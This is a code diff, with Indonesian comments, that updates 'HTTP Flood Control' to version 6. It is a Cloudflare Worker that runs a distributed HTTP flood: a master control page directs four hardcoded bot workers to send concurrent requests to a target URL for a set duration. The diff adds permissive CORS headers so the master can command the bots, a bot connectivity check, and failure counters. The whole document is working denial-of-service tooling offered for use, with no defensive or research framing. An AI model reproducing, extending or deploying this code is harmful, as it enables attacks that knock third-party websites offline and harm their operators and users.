@@ -1,8 +1,7 @@
 /**
- * HTTP Flood Control v5
- * 4 bot slot tetap (hardcoded)
- * Tidak ada input link bot di UI
- * Durasi = waktu serangan setiap bot
+ * HTTP Flood Control v6
+ * Fix CORS biar Master bisa perintah bot lain
+ * Semua Worker harus pakai kode ini
  */
 
 const BOTS = [
@@ -11,6 +10,13 @@ const BOTS = [
   'https://http-flood-control-3.aminaputra6.workers.dev',
   'https://http-flood-control-4.aminaputra6.workers.dev'
 ];
+
+const corsHeaders = {
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+  'Access-Control-Allow-Headers': 'Content-Type',
+  'Access-Control-Max-Age': '86400'
+};
 
 const BOT_HTML = `<!DOCTYPE html>
 <html lang="id">
@@ -70,7 +76,7 @@ button{flex:1;padding:13px;border:none;border-radius:10px;font-size:.9rem;font-w
 .live-feed{height:78px;overflow:hidden}
 .live-feed div{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .live-ok{color:#4ade80}.live-err{color:#f87171}.live-info{color:#7dd3fc}
-.log{background:#f8fafc;border:1px solid var(--border);border-radius:10px;height:150px;overflow-y:auto;padding:10px 12px;font-family:ui-monospace,monospace;font-size:.75rem;line-height:1.45}
+.log{background:#f8fafc;border:1px solid var(--border);border-radius:10px;height:160px;overflow-y:auto;padding:10px 12px;font-family:ui-monospace,monospace;font-size:.75rem;line-height:1.45}
 .log div{margin-bottom:2px}
 .ok{color:var(--ok)}.err{color:var(--err)}.info{color:var(--muted)}.warn{color:var(--warn)}
 .status{display:flex;align-items:center;gap:8px;margin-top:12px;font-size:.8rem;color:var(--muted)}
@@ -84,9 +90,9 @@ button{flex:1;padding:13px;border:none;border-radius:10px;font-size:.9rem;font-w
 <div class="wrap">
 <div class="card">
 <h1>Master Flood Control</h1>
-<p class="sub">4 bot slot tetap. Durasi = waktu serangan setiap bot.</p>
+<p class="sub">4 bot slot tetap. Pastikan semua bot sudah update kode terbaru.</p>
 
-<div class="bot-list" id="botList">
+<div class="bot-list">
   <div>Bot 1: http-flood-control-1</div>
   <div>Bot 2: http-flood-control-2</div>
   <div>Bot 3: http-flood-control-3</div>
@@ -100,9 +106,9 @@ button{flex:1;padding:13px;border:none;border-radius:10px;font-size:.9rem;font-w
 <div><label>Method</label>
 <select id="method"><option>GET</option><option>POST</option><option>HEAD</option></select></div>
 <div><label>Concurrency/bot</label>
-<input type="number" id="conc" value="15" min="1" max="25"></div>
+<input type="number" id="conc" value="12" min="1" max="20"></div>
 <div><label>Durasi (detik)</label>
-<input type="number" id="dur" value="15" min="5" max="60"></div>
+<input type="number" id="dur" value="15" min="5" max="45"></div>
 </div>
 
 <div class="btns">
@@ -129,7 +135,7 @@ button{flex:1;padding:13px;border:none;border-radius:10px;font-size:.9rem;font-w
 </div>
 
 <script>
-const BOTS = ${JSON.stringify(BOTS)};
+const BOTS = ["https://http-flood-control-1.aminaputra6.workers.dev","https://http-flood-control-2.aminaputra6.workers.dev","https://http-flood-control-3.aminaputra6.workers.dev","https://http-flood-control-4.aminaputra6.workers.dev"];
 const $ = id => document.getElementById(id);
 let running = false;
 let liveCount = 0;
@@ -139,7 +145,7 @@ function log(msg, cls='info'){
   d.className=cls;
   d.textContent='['+new Date().toLocaleTimeString('id-ID',{hour12:false})+'] '+msg;
   $('log').appendChild(d);
-  if($('log').children.length>35)$('log').removeChild($('log').firstChild);
+  if($('log').children.length>40)$('log').removeChild($('log').firstChild);
   $('log').scrollTop=$('log').scrollHeight;
 }
 function live(msg, cls='live-info'){
@@ -157,11 +163,14 @@ function setStatus(on,text){
 
 async function start(){
   const target = $('target').value.trim();
-  if(!target.startsWith('http')){log('Target URL tidak valid','err');return;}
+  if(!target.startsWith('http')){
+    log('Target URL tidak valid','err');
+    return;
+  }
 
   const method = $('method').value;
-  const conc = Math.min(25,Math.max(1,+$('conc').value||15));
-  const dur = Math.min(60,Math.max(5,+$('dur').value||15));
+  const conc = Math.min(20,Math.max(1,+$('conc').value||12));
+  const dur = Math.min(45,Math.max(5,+$('dur').value||15));
 
   running = true;
   $('btnStart').disabled=true;
@@ -178,7 +187,23 @@ async function start(){
 
   const t0 = Date.now();
   const end = t0 + dur*1000;
-  let sent=0, ok=0;
+  let sent=0, ok=0, fail=0;
+
+  // Test koneksi bot dulu
+  for(let i=0;i<BOTS.length;i++){
+    try{
+      const r = await fetch(BOTS[i].replace(/\/$/,'')+'/attack',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({url:'https://httpbin.org/status/200',method:'GET'})
+      });
+      log('Bot '+(i+1)+' terhubung (status '+r.status+')','ok');
+      live('bot'+(i+1)+' ready','live-ok');
+    }catch(e){
+      log('Bot '+(i+1)+' GAGAL: '+e.message,'err');
+      live('bot'+(i+1)+' OFFLINE','live-err');
+    }
+  }
 
   const workers = BOTS.map(async (botUrl, idx) => {
     const base = botUrl.replace(/\/$/, '');
@@ -193,16 +218,16 @@ async function start(){
             body:JSON.stringify({url:target,method})
           }).then(r=>{
             sent++;
-            if(r.ok || (r.status>=200&&r.status<500)) ok++;
+            if(r.status>=200 && r.status<500) ok++; else fail++;
             $('sSent').textContent=sent;
             $('sOk').textContent=ok;
             const elapsed=(Date.now()-t0)/1000;
             $('sRps').textContent=elapsed>0?Math.round(sent/elapsed):0;
-            if(sent%6===0) live(botName+' → '+(r.status||'?')+' | '+sent, r.ok?'live-ok':'live-err');
-          }).catch(()=>{
-            sent++;
+            if(sent%5===0) live(botName+' → '+r.status+' | '+sent, (r.status>=200&&r.status<500)?'live-ok':'live-err');
+          }).catch(e=>{
+            sent++; fail++;
             $('sSent').textContent=sent;
-            if(sent%6===0) live(botName+' → fail | '+sent,'live-err');
+            if(sent%5===0) live(botName+' → ERR | '+sent,'live-err');
           })
         );
       }
@@ -216,8 +241,8 @@ async function start(){
   $('btnStart').disabled=false;
   $('btnStop').disabled=true;
   setStatus(false,'Selesai');
-  live('>> ATTACK FINISHED','live-ok');
-  log('Selesai. Terkirim: '+sent+' | Sukses: '+ok,'ok');
+  live('>> FINISHED','live-ok');
+  log('Selesai. Terkirim: '+sent+' | Sukses: '+ok+' | Gagal: '+fail,'ok');
 }
 
 $('btnStart').onclick=start;
@@ -236,17 +261,23 @@ $('btnStop').onclick=()=>{
 export default {
   async fetch(request, env, ctx) {
     const u = new URL(request.url);
+
+    // Handle CORS preflight
+    if (request.method === 'OPTIONS') {
+      return new Response(null, { headers: corsHeaders });
+    }
+
     const mode = u.searchParams.get('mode') || 'bot';
 
     if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '') && mode === 'master') {
       return new Response(MASTER_HTML, {
-        headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
+        headers: { ...corsHeaders, 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
       });
     }
 
     if (request.method === 'GET' && (u.pathname === '/' || u.pathname === '')) {
       return new Response(BOT_HTML, {
-        headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
+        headers: { ...corsHeaders, 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' }
       });
     }
 
@@ -257,7 +288,7 @@ export default {
         const method = (body.method || 'GET').toUpperCase();
 
         if (!target.startsWith('http')) {
-          return new Response('bad url', { status: 400 });
+          return new Response('bad url', { status: 400, headers: corsHeaders });
         }
 
         const ctrl = new AbortController();
@@ -282,12 +313,12 @@ export default {
 
         const res = await fetch(target, opts);
         clearTimeout(to);
-        return new Response(null, { status: res.status });
+        return new Response(null, { status: res.status, headers: corsHeaders });
       } catch (e) {
-        return new Response(null, { status: 502 });
+        return new Response(null, { status: 502, headers: corsHeaders });
       }
     }
 
-    return new Response('Not Found', { status: 404 });
+    return new Response('Not Found', { status: 404, headers: corsHeaders });
   }
 };
